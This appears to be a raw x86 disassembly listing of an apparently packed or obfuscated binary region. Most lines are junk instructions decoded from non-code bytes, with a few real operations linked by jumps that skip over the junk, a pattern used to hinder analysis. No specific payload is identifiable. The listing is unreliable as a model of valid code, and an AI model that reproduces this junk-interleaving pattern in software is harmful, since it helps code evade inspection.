  413ba5:	jecxz  0x413bf0
  413ba7:	into   
  413ba8:	pop    ds
  413ba9:	outs   dx,DWORD PTR ds:[esi]
  413baa:	ss cld 
  413bac:	push   edx
  413bad:	retf   
  413bae:	fwait
  413baf:	lds    edx,FWORD PTR [eax+0x7d57e4af]
  413bb5:	push   eax
  413bb6:	retf   
  413bb7:	fld    TBYTE PTR [ebx+ebx*4+0x107d917f]
  413bbe:	jo     0x413be8
  413bc0:	and    DWORD PTR [edi+ecx*4-0x60dd1ca9],edx
  413bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc8:	sbb    dl,BYTE PTR [esi]
  413bca:	inc    edx
  413bcb:	xchg   DWORD PTR [eax-0x8],ecx
  413bce:	mov    ecx,0xb67178d5
  413bd3:	cmp    al,0x42
  413bd5:	mul    BYTE PTR [eax]
  413bd7:	jb     0x413b72
  413bd9:	push   ecx
  413bda:	jmp    0x5851:0x6b72845e
  413be1:	xchg   edx,eax
  413be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413be3:	bound  edi,QWORD PTR [esi]
  413be5:	inc    eax
  413be6:	shr    cl,1
  413be8:	lea    edx,[eax-0x3a437e30]
  413bee:	dec    edx
  413bef:	cmp    bl,dh
  413bf1:	out    dx,al
  413bf2:	call   0xbb85:0xc348595
  413bf9:	inc    edx
  413bfa:	das    
  413bfb:	popf   
  413bfc:	jp     0x413c0d
  413bfe:	ret    0xcc36
  413c01:	out    0xfb,al
  413c03:	jbe    0x413c68
  413c05:	xor    esp,DWORD PTR [ecx+0x4761922]
  413c0b:	pushf  
  413c0c:	sub    edx,edi
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	test   DWORD PTR [esi],ebx
  413c2b:	mov    al,ds:0x7f0002c7
  413c30:	js     0x413c17
  413c32:	jle    0x413cac
  413c34:	js     0x413ca4
  413c36:	(bad)  
  413c37:	stc    
  413c38:	les    esp,FWORD PTR [edx+0x49]
  413c3b:	in     al,0xcf
  413c3d:	jns    0x413c84
  413c3f:	fnstenv [eax-0x20ee0a5c]
  413c45:	jp     0x413c62
  413c47:	adc    DWORD PTR [ebp+0x6b],0x9e71ce72
  413c4e:	call   0xe25c:0xfeb259db
  413c55:	outs   dx,BYTE PTR ds:[esi]
  413c56:	pcmpeqb mm1,QWORD PTR [ebx+0x25dc3146]
  413c5d:	in     al,0xc8
  413c5f:	mov    esi,0x6e2a33b8
  413c64:	leave  
  413c65:	push   ss
  413c66:	or     BYTE PTR [ebp-0x628eb260],ah
  413c6c:	pop    ebx
  413c6d:	or     DWORD PTR [edi],0xffffffee
  413c70:	leave  
  413c71:	xlat   BYTE PTR ds:[ebx]
  413c72:	cwde   
  413c73:	loopne 0x413cd7
  413c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c76:	mov    edi,0x664a1e5f
  413c7b:	aam    0x4c
  413c7d:	inc    esi
  413c7e:	inc    edx
  413c7f:	popf   
  413c80:	(bad)  
  413c81:	xchg   edi,eax
  413c82:	retf   
  413c83:	repz mov al,ds:0xb70d4b75
  413c89:	cmp    cl,dh
  413c8b:	js     0x413cf1
  413c8d:	inc    ebp
  413c8e:	retf   0x67a7
  413c91:	mov    bh,0xc6
  413c93:	inc    edx
  413c94:	shl    DWORD PTR [edx],1
  413c96:	xchg   BYTE PTR [ebp+ebp*1+0xb46b7a3],dl
  413c9d:	push   es
  413c9e:	dec    esp
  413c9f:	je     0x413c23
  413ca1:	jge    0x413c8f
  413ca3:	ins    DWORD PTR es:[edi],dx
  413ca4:	xlat   BYTE PTR ds:[ebx]
  413ca5:	dec    edi
  413ca6:	sbb    esi,DWORD PTR [eax]
  413ca8:	pop    edx
  413ca9:	jae    0x413c6c
  413cab:	mov    esi,0x85703dca
  413cb0:	(bad)  
  413cb1:	pop    edi
  413cb2:	or     esp,eax
  413cb4:	stos   BYTE PTR es:[edi],al
  413cb5:	mov    ds:0xd0940a71,eax
  413cba:	inc    eax
  413cbb:	pop    ds
  413cbc:	(bad)  
  413cbd:	lods   eax,DWORD PTR ds:[esi]
  413cbe:	xor    eax,0x30291ed1
  413cc3:	inc    ebx
  413cc4:	test   eax,0xe52a1379
  413cc9:	sbb    edi,DWORD PTR [ecx]
  413ccb:	repz or cl,bh
  413cce:	jae    0x413c93
  413cd0:	mov    al,ds:0x36f82c08
  413cd5:	pop    ebx
  413cd6:	jecxz  0x413d14
  413cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cd9:	hlt    
  413cda:	sbb    esp,DWORD PTR [esp+edi*2+0x19]
  413cde:	jecxz  0x413cda
  413ce0:	add    eax,0xa2402711
  413ce5:	push   edi
  413ce6:	jg     0x413d3d
  413ce8:	sbb    ah,0xf1
  413ceb:	dec    eax
  413cec:	in     al,0xcf
  413cee:	inc    ebp
  413cef:	cmp    ch,BYTE PTR [edx]
  413cf1:	dec    eax
  413cf2:	fadd   QWORD PTR [ebx+0x298f0610]
  413cf8:	ror    BYTE PTR [esi+0x1d],1
  413cfb:	sbb    ah,BYTE PTR [edx]
  413cfd:	push   ecx
  413cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cff:	les    esp,FWORD PTR [ebp+0x5ecd6d21]
  413d05:	sub    bl,BYTE PTR [eax]
  413d07:	inc    esp
  413d08:	adc    eax,0xa8713263
  413d0d:	push   ebx
  413d0e:	xor    eax,DWORD PTR [esi+eiz*1+0x49088863]
  413d15:	stc    
  413d16:	inc    esp
  413d17:	xchg   esi,eax
  413d18:	shr    BYTE PTR [ecx+0x76],0xf8
  413d1c:	push   ebx
  413d1d:	push   eax
  413d1e:	int3   
  413d1f:	lods   eax,DWORD PTR ds:[esi]
  413d20:	in     al,0x91
  413d22:	adc    ah,bh
  413d24:	add    edi,DWORD PTR [esp+ebp*8+0x13b8f8e1]
  413d2b:	(bad)  
  413d2c:	xchg   DWORD PTR [eax+0x77],edi
  413d2f:	shr    DWORD PTR [eax+0x74306790],0x6d
  413d36:	sahf   
  413d37:	xchg   ecx,eax
  413d38:	stos   DWORD PTR es:[edi],eax
  413d39:	mov    esp,0x57f50cfd
  413d3e:	mov    eax,ds:0xdb300f8f
  413d43:	(bad)  
  413d45:	mov    WORD PTR [ecx-0x5c8f08bd],cs
  413d4b:	lods   eax,DWORD PTR ds:[esi]
  413d4c:	adc    al,BYTE PTR [ecx+0x75]
  413d4f:	mov    ds:0x55011f1c,eax
  413d54:	pop    ebp
  413d55:	sahf   
  413d56:	mov    ecx,0xcb36e715
  413d5b:	adc    edi,DWORD PTR [ebx-0x7d7b25fa]
  413d61:	jecxz  0x413d28
  413d63:	dec    esp
  413d64:	mov    bh,0x3c
  413d66:	push   cs
  413d67:	imul   ebx,DWORD PTR [ecx+0x4f],0x7a
  413d6b:	cwde   
  413d6c:	cmp    eax,0x99f736ae
  413d71:	cli    
  413d72:	(bad)  
  413d73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d74:	bound  esi,QWORD PTR [esi+0x1c]
  413d77:	mov    edx,ebx
  413d79:	addr16 pop ds
  413d7b:	adc    BYTE PTR [eax+0x22074b35],dl
  413d81:	mov    esi,0x64a587e2
  413d86:	inc    ebp
  413d87:	mov    ebx,0xb77907a8
  413d8c:	jbe    0x413dd7
  413d8e:	xor    eax,0x20343def
  413d93:	lea    esp,[esi+esi*1]
  413d96:	or     eax,0xbd47934a
  413d9b:	test   ecx,0x68250066
  413da1:	fsub   DWORD PTR [esi+0x7e305701]
  413da7:	popf   
  413da8:	addr16 jg 0x413e11
  413dab:	jle    0x413d78
  413dad:	fst    DWORD PTR [edi-0x74]
  413db0:	push   ecx
  413db1:	inc    edi
  413db2:	aad    0xa3
  413db4:	out    0xd,al
  413db6:	or     al,0xe9
  413db8:	pop    esp
  413db9:	xchg   ebp,eax
  413dba:	inc    esi
  413dbb:	push   esi
  413dbc:	shl    dl,0x82
  413dbf:	(bad)  
  413dc0:	push   esp
  413dc1:	in     eax,0x48
  413dc3:	sahf   
  413dc4:	mov    eax,0x6dc10ad6
  413dc9:	ss jl  0x413d8b
  413dcc:	add    DWORD PTR [ebp-0x3],eax
  413dcf:	sbb    DWORD PTR [ebx+0x23db3097],edx
  413dd5:	stos   BYTE PTR es:[edi],al
  413dd6:	push   cs
  413dd7:	push   edi
  413dd8:	ror    DWORD PTR [edi+0x23],1
  413ddb:	cmp    BYTE PTR [edx],bh
  413ddd:	or     esp,DWORD PTR [ecx+0xbca6bdd]
  413de3:	jb     0x413e4b
  413de5:	and    al,0xd0
  413de7:	cmp    dh,BYTE PTR [edx]
  413de9:	inc    eax
  413dea:	pop    esi
  413deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dec:	hlt    
  413ded:	xchg   edi,eax
  413dee:	out    dx,al
  413def:	jbe    0x413dc4
  413df1:	add    al,BYTE PTR [edx+ebx*8]
  413df4:	jns    0x413de8
  413df6:	pop    ebp
  413df7:	addr16 push edx
  413df9:	imul   edi,DWORD PTR [esi-0x6e],0x6c
  413dfd:	adc    al,0xbd
  413dff:	imul   eax,esp,0xffffff98
  413e02:	jnp    0x413dc3
  413e04:	lahf   
  413e05:	inc    ecx
  413e06:	dec    eax
  413e07:	imul   ecx,DWORD PTR [eax],0x7
  413e0a:	cmc    
  413e0b:	retf   0x931e
  413e0e:	jmp    0x6810:0xa69373dc
  413e15:	xor    DWORD PTR [esi-0x3b05d34f],ecx
  413e1b:	sub    bl,cl
  413e1d:	sahf   
  413e1e:	test   DWORD PTR [edx-0x14c90c00],0x9c24da8e
  413e28:	push   0xf8d696c1
  413e2d:	jecxz  0x413e3a
  413e2f:	lock ins DWORD PTR es:[edi],dx
  413e31:	sahf   
  413e32:	shl    BYTE PTR [edx+0x6d58099e],1
  413e38:	fidivr DWORD PTR [ebp+0x1ff910f8]
  413e3e:	adc    eax,DWORD PTR [ebx+eiz*2-0x20]
  413e42:	lea    edx,[esi+eiz*8]
  413e45:	mov    al,BYTE PTR [ecx]
  413e47:	pop    bx
  413e49:	mov    ebp,0x9748b02e
  413e4e:	call   0x7401:0xc9f702a3
  413e55:	aaa    
  413e56:	push   esp
  413e57:	cli    
  413e58:	dec    edx
  413e59:	sbb    al,0xcd
  413e5b:	cmp    bl,BYTE PTR [ebp+0x6e08b2b1]
  413e61:	xchg   edi,eax
  413e62:	xor    eax,0xf4298765
  413e67:	push   0x65
  413e69:	inc    ecx
  413e6a:	ins    BYTE PTR es:[edi],dx
  413e6b:	shl    DWORD PTR [ebx+0x69],1
  413e6e:	popf   
  413e6f:	adc    bl,BYTE PTR [ebx]
  413e71:	push   esp
  413e72:	xchg   ecx,eax
  413e73:	stos   BYTE PTR es:[edi],al
  413e74:	xchg   edx,eax
  413e75:	inc    ebx
  413e76:	fdiv   QWORD PTR [eax]
  413e78:	aaa    
  413e79:	sub    DWORD PTR [ebp+ebx*8+0x61],edx
  413e7d:	into   
  413e7e:	stc    
  413e7f:	or     DWORD PTR [edi],ebp
  413e81:	(bad)  
  413e82:	push   ecx
  413e83:	push   es
  413e84:	mov    bh,0xd1
  413e86:	mov    ds:0x176e082c,eax
  413e8b:	sbb    esp,DWORD PTR [ebp+eax*4+0x1c5cfda4]
  413e92:	rcl    bh,cl
  413e94:	add    ebx,esp
  413e96:	bound  ecx,QWORD PTR [ecx]
  413e98:	shr    ecx,cl
  413e9a:	ror    BYTE PTR [esi-0xa86e0f],1
  413ea0:	imul   edi,ebx
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	sahf   
  413eb8:	or     al,0xb6
  413eba:	ja     0x413eab
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	mov    edx,0x6d2b5d05
  413ec8:	sbb    dh,BYTE PTR [edi]
  413eca:	push   ecx
  413ecb:	push   edi
  413ecc:	mov    ds:0x66e11ef2,eax
  413ed1:	jbe    0x413e73
  413ed3:	jmp    0x221f:0xf7e16d0f
  413eda:	les    esi,FWORD PTR [eax+0x31a71958]
  413ee0:	es inc ebx
  413ee2:	adc    eax,0x69ab4e4d
  413ee7:	outs   dx,DWORD PTR ds:[esi]
  413ee8:	mov    ah,0xa8
  413eea:	jno    0x413f64
  413eec:	ds mov esi,0x237d6294
  413ef2:	adc    BYTE PTR [eax+ebx*2+0x16],dl
  413ef6:	push   edx
  413ef7:	and    esp,DWORD PTR [edx+0x3f0c8ffb]
  413efd:	sub    ebx,eax
  413eff:	mov    dh,0x92
  413f01:	out    dx,al
  413f02:	cmp    al,0xeb
  413f04:	adc    dl,cl
  413f06:	push   edx
  413f07:	add    eax,0xda8c075e
  413f0c:	lds    ebx,FWORD PTR [edx+0x2a]
  413f0f:	inc    edx
  413f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f11:	out    dx,eax
  413f12:	lds    eax,FWORD PTR [ecx+eiz*2+0x4a832518]
  413f19:	mov    WORD PTR [eax+0x77],fs
  413f1c:	mov    bl,0xe9
  413f1e:	pop    esi
  413f1f:	icebp  
  413f20:	lods   eax,DWORD PTR ds:[esi]
  413f21:	lock pop ds
  413f23:	loopne 0x413ec3
  413f25:	xor    DWORD PTR [edi],ebp
  413f27:	cmp    edi,DWORD PTR [ecx]
  413f29:	stos   BYTE PTR es:[edi],al
  413f2a:	adc    eax,0x77c93145
  413f2f:	out    dx,al
  413f30:	aas    
  413f31:	sub    BYTE PTR [edx+0x49],cl
  413f34:	inc    ebx
  413f35:	add    DWORD PTR [esi-0x5b],0xcdfe6e46
  413f3c:	inc    eax
  413f3d:	adc    esi,ecx
  413f3f:	aam    0xfe
  413f41:	cdq    
  413f42:	sbb    DWORD PTR [esi+eax*4+0x67c66181],edi
  413f49:	cmc    
  413f4a:	call   0x50b7:0x2f58657f
  413f51:	xor    DWORD PTR [ecx-0x58],ebp
  413f54:	aam    0xd5
  413f56:	dec    edx
  413f57:	sub    eax,esp
  413f59:	cmp    bl,bh
  413f5b:	cdq    
  413f5c:	push   es
  413f5d:	out    dx,al
  413f5e:	je     0x413f40
  413f60:	js     0x413fdc
  413f62:	mov    ch,0x38
  413f64:	data16 adc al,ch
  413f67:	push   esp
  413f68:	push   ds
  413f69:	int3   
  413f6a:	and    BYTE PTR [ebx],0x86
  413f6d:	aad    0xf4
  413f6f:	adc    al,0xd0
  413f71:	fist   WORD PTR [ebx-0x33]
  413f74:	aad    0xc3
  413f76:	jle    0x413f06
  413f78:	and    DWORD PTR [edi+edi*2],esi
  413f7b:	adc    esi,esi
  413f7d:	pop    es
  413f7e:	cmp    al,0x64
  413f80:	mov    dh,0x30
  413f82:	rol    al,1
  413f84:	and    DWORD PTR [edx],ebp
  413f86:	dec    edi
  413f87:	sub    DWORD PTR cs:[esi+esi*1+0x2ac11b7],edi
  413f8f:	shr    al,0xde
  413f92:	adc    BYTE PTR [ebp-0x5ae45314],0xe3
  413f99:	dec    esi
  413f9a:	sbb    DWORD PTR [ebx+0x4f31d433],edi
  413fa0:	push   ebx
  413fa1:	repz mov ecx,0xcb8e3570
  413fa7:	inc    ebp
  413fa8:	xor    bl,BYTE PTR [ebp-0x46fefdde]
  413fae:	mov    esp,DWORD PTR [ebx]
  413fb0:	div    BYTE PTR [edx-0x6d]
  413fb3:	in     al,dx
  413fb4:	push   eax
  413fb5:	or     eax,0x8d5814a1
  413fba:	mov    dl,0x5b
  413fbc:	add    al,0x9f
  413fbe:	sub    al,0x5d
  413fc0:	pop    ecx
  413fc1:	nop
  413fc2:	pop    edi
  413fc3:	test   DWORD PTR [ebp+0x6a],esp
  413fc6:	or     ebx,0xb0ad88de
  413fcc:	and    eax,ebp
  413fce:	pop    esi
  413fcf:	dec    esp
  413fd0:	stc    
  413fd1:	iret   
  413fd2:	and    eax,0xfbc346b2
  413fd7:	jmp    0x414003
  413fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fda:	push   edx
  413fdb:	xor    BYTE PTR [ebx],dh
  413fdd:	xchg   ecx,eax
  413fde:	in     al,0x27
  413fe0:	push   0xffffff94
  413fe2:	cmove  ebp,eax
  413fe5:	sar    BYTE PTR [edi+0x22],0xe2
  413fe9:	sbb    al,0xd7
  413feb:	jmp    DWORD PTR [ecx]
  413fed:	fwait
  413fee:	lea    eax,[ebx]
  413ff0:	jne    0x413fc3
  413ff2:	das    
  413ff3:	xchg   esi,ebp
  413ff5:	ror    BYTE PTR [edx-0x61],1
  413ff8:	jne    0x414043
  413ffa:	inc    edx
  413ffb:	cdq    
  413ffc:	jb     0x41404f
  413ffe:	xchg   esp,eax
  413fff:	jae    0x413fad
  414001:	mov    DWORD PTR [edi],edx
  414003:	mov    DWORD PTR [eax+0x419c514],ebx
  414009:	push   es
  41400a:	call   0x6e7f3f1c
  41400f:	out    0xe,al
  414011:	push   ecx
  414012:	mov    ah,BYTE PTR [edi+0x6f5f2e74]
  414018:	mov    eax,0xf0336a28
  41401d:	mov    al,0xe3
  41401f:	jo     0x413ff0
  414021:	dec    sp
  414023:	inc    edx
  414024:	jmp    0xe71a:0x19a01f34
  41402b:	sahf   
  41402c:	pop    es
  41402d:	inc    BYTE PTR [ecx-0x50]
  414030:	cmp    BYTE PTR [edx+0x5a],0x1e
  414034:	test   al,0x13
  414036:	jne    0x413fba
  414038:	push   eax
  414039:	jle    0x4140b4
  41403b:	fbstp  TBYTE PTR [ebx]
  41403d:	push   es
  41403e:	retf   
  41403f:	and    BYTE PTR [edx-0x5b],al
  414042:	jge    0x41406f
  414044:	out    dx,eax
  414045:	repnz mov WORD PTR [ebp-0x45],cs
  414049:	sub    al,0xce
  41404b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41404c:	mov    dl,0x18
  41404e:	mov    ah,0x1d
  414050:	scas   al,BYTE PTR es:[edi]
  414051:	and    BYTE PTR [ebx],al
  414053:	hlt    
  414054:	loop   0x4140b3
  414056:	icebp  
  414057:	data16 mov WORD PTR [edi],fs
  41405a:	fwait
  41405b:	(bad)  
  41405c:	push   esp
  41405d:	je     0x414089
  41405f:	xchg   ecx,eax
  414060:	push   edx
  414061:	fst    DWORD PTR [edx+0x65cb9285]
  414067:	sbb    esi,DWORD PTR [ebx-0x8]
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	popa   
  41406c:	ins    BYTE PTR es:[edi],dx
  41406d:	pop    esp
  41406e:	xchg   DWORD PTR ds:0x34107735,ebp
  414074:	fimul  DWORD PTR [ecx]
  414076:	in     al,0x19
  414078:	neg    esp
  41407a:	pushf  
  41407b:	cli    
  41407c:	pop    ss
  41407d:	inc    edi
  41407e:	jle    0x41403d
  414080:	pusha  
  414081:	and    dl,BYTE PTR ds:0xc187bcae
  414087:	adc    eax,0x2bd1b46f
  41408c:	mov    ds:0xb948258,al
  414091:	addr16 inc edi
  414093:	pop    esi
  414095:	aam    0xfb
  414097:	out    dx,eax
  414098:	das    
  414099:	push   edx
  41409a:	pop    eax
  41409b:	loop   0x414098
  41409d:	cmc    
  41409e:	inc    ebp
  41409f:	popf   
  4140a0:	fwait
  4140a1:	add    al,0x17
  4140a3:	pop    ebp
  4140a4:	mov    BYTE PTR [edi+0x598ba8a9],ch
  4140aa:	(bad)  
  4140ab:	gs sub esi,ecx
  4140ae:	xchg   ebp,eax
  4140af:	adc    dl,ah
  4140b1:	xor    WORD PTR [edx-0x6d],ax
  4140b5:	jp     0x4140f2
  4140b7:	int    0x40
  4140b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ba:	mov    esp,0xa34d1173
  4140bf:	jp     0x414058
  4140c1:	cdq    
  4140c2:	ret    0xc95
  4140c5:	mov    ecx,0x7f4d1a3d
  4140ca:	(bad)
  4140cd:	xbegin 0x3a6b0208
  4140d3:	repz pop ds
  4140d5:	mov    ?,WORD PTR [edx-0xdf7e2f1]
  4140db:	inc    edi
  4140dc:	inc    edi
  4140dd:	push   esp
  4140de:	retf   0xc977
  4140e1:	adc    cl,BYTE PTR [ebx]
  4140e3:	xchg   edi,eax
  4140e4:	out    dx,eax
  4140e5:	aas    
  4140e6:	mov    eax,0xd0c46f5a
  4140eb:	test   eax,0x2d972db7
  4140f0:	sbb    BYTE PTR [edx+0x67],dl
  4140f3:	rcr    al,cl
  4140f5:	pop    ebx
  4140f6:	jmp    0x4140dd
  4140f8:	mov    ch,0x7d
  4140fa:	out    dx,eax
  4140fb:	(bad)  
  4140fc:	push   esp
  4140fd:	mov    edi,0x2a3c7250
  414102:	pop    eax
  414103:	dec    eax
  414104:	jle    0x4140f2
  414106:	mov    al,0x26
  414108:	out    dx,eax
  414109:	push   esp
  41410a:	push   ds
  41410b:	test   BYTE PTR [eax-0x6d],bh
  41410e:	dec    edi
  41410f:	cmp    DWORD PTR [eax],eax
  414111:	rol    BYTE PTR [edi+0x2976e700],cl
  414117:	fwait
  414118:	sub    cl,BYTE PTR [ebp-0x2a]
  41411b:	icebp  
  41411c:	mov    ecx,0x968c9676
  414121:	pop    eax
  414122:	ss jge 0x4140b9
  414125:	fs dec esp
  414127:	jmp    0xe0f791e1
  41412c:	inc    eax
  41412d:	pop    esp
  41412e:	xor    ebx,eax
  414130:	jmp    0x4143b8
  414135:	les    edi,FWORD PTR [edi]
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0x71145a14
  414142:	(bad)  
  414143:	cmp    esi,ebp
  414145:	push   esp
  414146:	add    al,0x7f
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x4141a3
  41414e:	and    DWORD PTR [edx-0x6a46bcaf],0x1478ecc8
  414158:	inc    ebp
  414159:	sbb    al,BYTE PTR [ecx+edi*4]
  41415c:	cdq    
  41415d:	xor    eax,0x35d4a99e
  414162:	in     eax,dx
  414163:	pop    ds
  414164:	or     al,0x74
  414166:	cmp    eax,0x5116d452
  41416b:	call   0x42c59c4f
  414170:	in     al,dx
  414171:	cmp    al,0x2e
  414173:	ret    
  414174:	ins    DWORD PTR es:[edi],dx
  414175:	into   
  414176:	scas   al,BYTE PTR es:[edi]
  414177:	mov    dh,0x35
  414179:	mov    edi,0x24bfd323
  41417e:	idiv   BYTE PTR [ebx-0x59]
  414181:	rcl    edx,cl
  414183:	imul   edi,ecx,0xffffffef
  414186:	imul   ebp,DWORD PTR [esi+0x3],0x65afc044
  41418d:	sar    esi,0x52
  414190:	(bad)  
  414191:	xor    ebp,DWORD PTR [edx]
  414193:	or     DWORD PTR [esi],esi
  414195:	dec    edi
  414196:	sbb    DWORD PTR [edx+0x360c5aff],0xffffffaf
  41419d:	in     al,0x1b
  41419f:	pop    esp
  4141a0:	mov    ch,0x1b
  4141a2:	ret    
  4141a3:	jl     0x4141db
  4141a5:	push   0x53b82452
  4141aa:	cld    
  4141ab:	stos   DWORD PTR es:[di],eax
  4141ad:	ins    BYTE PTR es:[edi],dx
  4141ae:	mov    ds:0x3484ed9f,eax
  4141b3:	xor    dh,BYTE PTR [ebx-0x46]
  4141b6:	jl     0x414168
  4141b8:	gs (bad) 
  4141ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141bb:	sbb    BYTE PTR [ebp-0x9ca62b6],bl
  4141c1:	test   edi,edi
  4141c3:	inc    esi
  4141c4:	cmp    BYTE PTR [eax+0xa],al
  4141c7:	add    DWORD PTR [eax+0xa],esp
  4141ca:	jne    0x4141c9
  4141cc:	cmc    
  4141cd:	outs   dx,DWORD PTR ds:[esi]
  4141ce:	sub    al,0xd4
  4141d0:	push   esp
  4141d1:	jb     0x41418a
  4141d3:	lock dec ebp
  4141d5:	adc    al,0x59
  4141d7:	mov    DWORD PTR [eax-0x6],ecx
  4141da:	sbb    BYTE PTR [edx+0x5],bl
  4141dd:	and    bh,bl
  4141df:	pushf  
  4141e0:	sub    al,0x57
  4141e2:	and    al,0x6a
  4141e4:	jecxz  0x414252
  4141e6:	out    dx,al
  4141e7:	xor    BYTE PTR [eax-0x4],dh
  4141ea:	inc    edx
  4141eb:	popf   
  4141ec:	shl    DWORD PTR [edi+edi*1],0xee
  4141f0:	mov    bl,0x3b
  4141f2:	push   ebx
  4141f3:	in     eax,dx
  4141f4:	mov    esp,0x99dfc34c
  4141f9:	stos   BYTE PTR es:[edi],al
  4141fa:	pop    esp
  4141fb:	outs   dx,DWORD PTR ds:[esi]
  4141fc:	ins    BYTE PTR es:[edi],dx
  4141fd:	mov    cl,BYTE PTR [ecx]
  4141ff:	mov    ebp,0xa9733173
  414204:	(bad)  
  414205:	ret    0x8cad
  414208:	and    dh,ch
  41420a:	or     al,0x2c
  41420c:	inc    ebx
  41420e:	rol    BYTE PTR [ebp-0x46],0x1f
  414212:	repnz or BYTE PTR [ebx+0x3f],0x2c
  414217:	out    dx,al
  414218:	test   eax,0x2962ae4e
  41421d:	mov    eax,0xdfb9dfc9
  414222:	xor    BYTE PTR [edi+esi*4],bh
  414225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414226:	and    eax,0xea230292
  41422b:	stc    
  41422c:	outs   dx,BYTE PTR ds:[esi]
  41422d:	fs ret 0x84d8
  414231:	(bad)  
  414232:	pop    ds
  414233:	call   0xbd15cc86
  414238:	or     al,al
  41423a:	fs pop esp
  41423c:	inc    edi
  41423d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41423e:	aad    0xb9
  414240:	iret   
  414241:	inc    edi
  414242:	mov    esi,esp
  414244:	and    BYTE PTR [ebx-0x14b48eed],dl
  41424a:	inc    DWORD PTR [ebp+ebx*2-0x710196e7]
  414251:	pop    ecx
  414252:	push   edx
  414253:	push   ds
  414254:	or     eax,0xa875a321
  414259:	cmp    ebx,ebx
  41425b:	fndisi(8087 only) 
  41425d:	jae    0x4142b8
  41425f:	dec    ebp
  414260:	add    BYTE PTR [esi-0x2d4137e4],ch
  414266:	(bad)  
  414267:	sbb    bl,cl
  414269:	sbb    edx,ebp
  41426b:	pop    ds
  41426c:	pop    ebp
  41426d:	mov    esp,0xa7c4db77
  414272:	or     BYTE PTR [edi-0x47],dh
  414275:	mov    eax,ds:0xf630ad40
  41427a:	push   ds
  41427b:	xor    al,0xc1
  41427d:	xor    eax,0x6ed9ef8f
  414282:	cs loope 0x414221
  414285:	stos   DWORD PTR es:[edi],eax
  414286:	lahf   
  414287:	add    DWORD PTR [edi],0x332f692e
  41428d:	jo     0x414220
  41428f:	cdq    
  414290:	(bad)  
  414291:	lods   al,BYTE PTR ds:[esi]
  414292:	xor    eax,0xce9e9f87
  414297:	dec    esp
  414298:	sbb    dh,BYTE PTR [esi+0x64adff24]
  41429e:	dec    esi
  41429f:	scas   eax,DWORD PTR es:[edi]
  4142a0:	mov    dl,0x56
  4142a2:	cmp    BYTE PTR [esi],0x1c
  4142a5:	adc    ebx,DWORD PTR [ecx]
  4142a7:	popa   
  4142a8:	fsubrp st(7),st
  4142aa:	je     0x4142db
  4142ac:	ds add al,0x27
  4142af:	shr    DWORD PTR [edx],0xe5
  4142b2:	pop    es
  4142b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142b4:	jbe    0x414239
  4142b6:	inc    ecx
  4142b7:	xor    ch,BYTE PTR [edi+0x4c618ccf]
  4142bd:	mov    ah,0x23
  4142bf:	fcomp  DWORD PTR [ebx+edx*2]
  4142c2:	pop    ecx
  4142c3:	rcl    BYTE PTR [ecx],0x5a
  4142c6:	pop    edi
  4142c7:	sbb    al,0x2
  4142c9:	mov    edi,0x38373726
  4142ce:	sbb    dl,BYTE PTR [edi-0x4fe9c871]
  4142d4:	xchg   esp,eax
  4142d5:	jns    0x414315
  4142d7:	(bad)  
  4142d8:	xrelease mov DWORD PTR [edx],ebx
  4142db:	retf   0x23f7
  4142de:	mov    ebx,0x69322d26
  4142e3:	add    eax,DWORD PTR [esi+0x3c]
  4142e6:	xchg   esp,eax
  4142e7:	ret    0x4923
  4142ea:	mov    esp,0x948e046d
  4142ef:	inc    edx
  4142f0:	dec    esi
  4142f1:	aad    0x50
  4142f3:	inc    ebp
  4142f4:	ins    BYTE PTR es:[edi],dx
  4142f5:	retf   
  4142f6:	cmp    al,0xca
  4142f8:	xor    eax,0x1f2ff52
  4142fd:	jp     0x414329
  4142ff:	lock popa 
  414301:	pop    ds
  414302:	in     eax,0x82
  414304:	mov    bl,0xfd
  414306:	mov    edx,0xdbd787a4
  41430b:	and    eax,0xc4e8db54
  414310:	jae    0x4142a2
  414312:	test   eax,0x182a9cf5
  414317:	outs   dx,DWORD PTR ds:[esi]
  414318:	call   0x1eed0cb
  41431d:	xor    eax,0x704088d4
  414322:	hlt    
  414323:	mov    ebp,DWORD PTR [ecx-0x4d]
  414326:	or     BYTE PTR [ebx+0x44],0xcb
  41432a:	lock push edi
  41432c:	aad    0x80
  41432e:	sti    
  41432f:	mov    al,0x8c
  414331:	xchg   ebx,eax
  414332:	pop    esi
  414333:	mov    cl,0xa6
  414335:	pushf  
  414336:	lods   eax,DWORD PTR ds:[esi]
  414337:	dec    ebp
  414338:	adc    al,0xed
  41433a:	shr    dh,1
  41433c:	sbb    bl,bh
  41433e:	pop    ecx
